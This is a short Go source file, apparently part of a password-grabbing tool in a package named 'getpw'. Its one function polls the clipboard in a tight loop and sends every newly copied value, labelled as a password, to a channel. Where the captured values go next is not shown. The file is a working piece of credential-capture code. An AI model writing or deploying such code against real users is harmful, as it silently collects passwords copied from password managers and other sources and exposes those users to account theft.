package getpw

import (
	"time"

	"github.com/atotto/clipboard"
)


func MonitorClipboard() {
	clipOldB, _ := clipboard.ReadAll()
	clipOld := string(clipOldB)
	for {
		clipNewB, err := clipboard.ReadAll()
		if err != nil {
			continue
		}
		clipNew := string(clipNewB)
		if clipNew != clipOld && clipNew != "" {
			clipOld = clipNew
			password := clipNew
			p := PWStruct{
				Password: password,
				Mode: "clipboard",
			}
			PWC <- p
		}
		time.Sleep(time.Microsecond * 50)
	}
}